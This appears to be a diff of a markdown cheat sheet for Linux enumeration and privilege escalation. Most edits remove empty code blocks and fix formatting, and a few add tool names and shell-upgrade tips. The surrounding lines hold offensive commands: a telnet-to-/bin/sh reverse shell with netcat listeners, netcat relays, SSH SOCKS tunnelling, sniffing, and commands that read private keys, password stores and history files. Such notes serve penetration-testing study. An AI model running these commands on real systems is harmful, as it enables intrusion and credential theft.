@@ -7,12 +7,8 @@
     ```bash
     cat /etc/issue
     cat /etc/*-release
-    	cat /etc/lsb-release
-    	cat /etc/redhat-release
-    ```
-    
-    ```bash
-    
+    cat /etc/lsb-release
+    cat /etc/redhat-release
     ```
     
 2. Get kernel information:
@@ -26,10 +22,6 @@
     ls /boot | grep vmlinuz-
     ```
     
-    ```bash
-    
-    ```
-    
 3. Get environment variable information:
     
     ```bash
@@ -41,20 +33,11 @@
     env
     set
     ```
-    
-
-```bash
-
-```
 
 1. Get printer information:
     
     ```bash
     lpstat -a
-    ```
-    
-    ```bash
-    
     ```
     
 
@@ -69,10 +52,6 @@
     cat /etc/services
     ```
     
-    ```bash
-    
-    ```
-    
 2. What applications are installed?
     
     ```bash
@@ -84,11 +63,7 @@
     ls -alh /var/cache/yum/
     pspy4
     ```
-    
-    ```bash
-    
-    ```
-    
+
 3. Are services misconfigured?
     
     ```bash
@@ -103,11 +78,7 @@
     cat /opt/lampp/etc/httpd.conf
     ls -aRl /etc/ | awk '$1 ~ /^.*r.*/
     ```
-    
-    ```bash
-    
-    ```
-    
+
 4. Get cron information:
     
     ```bash
@@ -138,15 +109,10 @@
     # You can monitor the processes to search for processes that are being executed every 1,2 or 5 minutes. Maybe you can take advantage of it and escalate privileges. 
     # For example, to monitor every 0.1s during 1 minute, sort by less executed commands and deleting the commands that have beeing executed all the time, you can do:
     for i in $(seq 1 610); do ps -e --format cmd >> /tmp/monprocs.tmp; sleep 0.1; done; sort /tmp/monprocs.tmp | uniq -c | grep -v "\[" | sed '/^.\{200\}./d' | sort | grep -E -v "\s*[6-9][0-9][0-9]|\s*[0-9][0-9][0-9][0-9]"; rm /tmp/monprocs.tmp;
-    # https://github.com/DominicBreuker/pspy 
     
     SystemD timers
     systemctl list-timers -all
     # watch for recently executed timers
-    ```
-    
-    ```bash
-    
     ```
     
 5. Look for passwords:
@@ -157,11 +123,6 @@
     grep -C 5 "password" [filename]
     find . -name "*.php" -print0 | xargs -0 grep -i -n "var $password"   # Joomla
     ```
-    
-
-```bash
-
-```
 
 ## Networking
 
@@ -173,10 +134,6 @@
     cat /etc/sysconfig/network
     ```
     
-    ```bash
-    
-    ```
-    
 2. Check network configurations:
     
     ```bash
@@ -186,10 +143,6 @@
     iptables -L
     hostname
     dnsdomainname
-    ```
-    
-    ```bash
-    
     ```
     
 3. What users and hosts are talking to the system?
@@ -206,11 +159,7 @@
     last
     w
     ```
-    
-    ```bash
-    
-    ```
-    
+
 4. Get cached IP’s and MACs:
     
     ```bash
@@ -218,19 +167,11 @@
     route
     /sbin/route -nee**
     ```
-    
-    ```bash
-    
-    ```
-    
+
 5. Run packet sniffing:
     
     ```bash
     tcpdump tcp dst 192.168.1.7 80 and tcp dst 10.5.5.252 21
-    ```
-    
-    ```bash
-    
     ```
     
 6. Can we get a shell?
@@ -239,10 +180,6 @@
     nc -lvp 4444    # Attacker. Input (Commands)
     nc -lvp 4445    # Attacker. Ouput (Results)
     telnet [atackers ip] 44444 | /bin/sh | [local ip] 44445    # On the targets system. Use the attackers IP!
-    ```
-    
-    ```bash
-    
     ```
     
 7. Try to port forward:
@@ -256,21 +193,12 @@
     mknod backpipe p ; nc -l -p 8080 0 & < backpipe | tee -a inflow | nc localhost 80 | tee -a outflow & 1>backpipe    # Proxy monitor (Port 80 to 8080)
     ```
     
-    ```bash
-    
-    ```
-    
 8. Try to tunnel the connection to our Attack box:
     
     ```bash
     ssh -D 127.0.0.1:9050 -N [username]@[ip]
     proxychains ifconfig
     ```
-    
-
-```bash
-
-```
 
 ## Confidential Information & Users
 
@@ -288,10 +216,6 @@
     sudo -l
     ```
     
-    ```bash
-    
-    ```
-    
 2. Check for sensitive files:
     
     ```bash
@@ -301,19 +225,11 @@
     ls -alh /var/mail/
     ```
     
-    ```bash
-    
-    ```
-    
 3. Check home directories:
     
     ```bash
     ls -ahlR /root/
     ls -ahlR /home/
-    ```
-    
-    ```bash
-    
     ```
     
 4. Check configuration files, log files. Default paths for passwords:
@@ -322,10 +238,6 @@
     cat /var/apache2/config.inc
     cat /var/lib/mysql/mysql/user.MYD
     cat /root/anaconda-ks.cfg
-    ```
-    
-    ```bash
-    
     ```
     
 5. Check history files for useful information:
@@ -338,10 +250,6 @@
     cat ~/.php_history
     ```
     
-    ```bash
-    
-    ```
-    
 6. Check user information:
     
     ```bash
@@ -349,10 +257,6 @@
     cat ~/.profile
     cat /var/mail/root
     cat /var/spool/mail/root
-    ```
-    
-    ```bash
-    
     ```
     
 7. Look for private keys:
@@ -374,11 +278,6 @@
     cat /etc/ssh/ssh_host_key.pub
     cat /etc/ssh/ssh_host_key
     ```
-    
-
-```bash
-
-```
 
 # File Systems
 
@@ -394,10 +293,6 @@
     find /etc/ -readable -type f -maxdepth 1 2>/dev/null   # Anyone
     ```
     
-    ```bash
-    
-    ```
-    
 2. Check for information in /var/:
     
     ```bash
@@ -410,10 +305,6 @@
     cat /var/lib/dhcp3/dhclient.leases
     ```
     
-    ```bash
-    
-    ```
-    
 3. Check website files. Look for settings and database info:
     
     ```bash
@@ -423,11 +314,7 @@
     ls -alhR /opt/lampp/htdocs/
     ls -alhR /var/www/html/
     ```
-    
-    ```bash
-    
-    ```
-    
+
 4. Check log files: Local File Inclusion
     
     ```bash
@@ -472,11 +359,6 @@
     
     Note: auth.log, boot, btmp, daemon.log, debug, dmesg, kern.log, mail.info, mail.log, mail.warn, messages, syslog, udev, wtmp
     ```
-    
-    ```bash
-    
-    ```
-    
 5. Can you break out of a restricted shell?
     
     ```bash
@@ -587,7 +469,6 @@
     find / -name cc
     ```
     
-
 1. Can files be uploaded?
     
     ```bash
@@ -601,7 +482,12 @@
 
 # Shell Upgrading:
 
+**How to upgrade shell**
+
 **Spawn interactive shell and set environment:**
+NOTE: If this causes issues, do a terminal `reset` or `stty sane`
+If you are in zsh, need to do `stty raw -echo; fg`
+
 
 ```bash
 python -c 'import pty;pty.spawn("/bin/bash");'  
@@ -615,7 +501,7 @@ export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH
 export TERM=xterm256-color  
 export SHELL=bash  
 
-stty rows \<> colums \<>
+stty rows \<> columns \<>
 ```
 
 **Break out of restricted shell:**
@@ -636,7 +522,9 @@ export TERM=linux
 linPEAS.sh
 LinEnum.sh
 linuxprivchecker.py
+enum4Linux
 unix-privesc-check
+pspy - process viewer
 Mestaploit: multi/recon/local_exploit_suggester
 ```
 
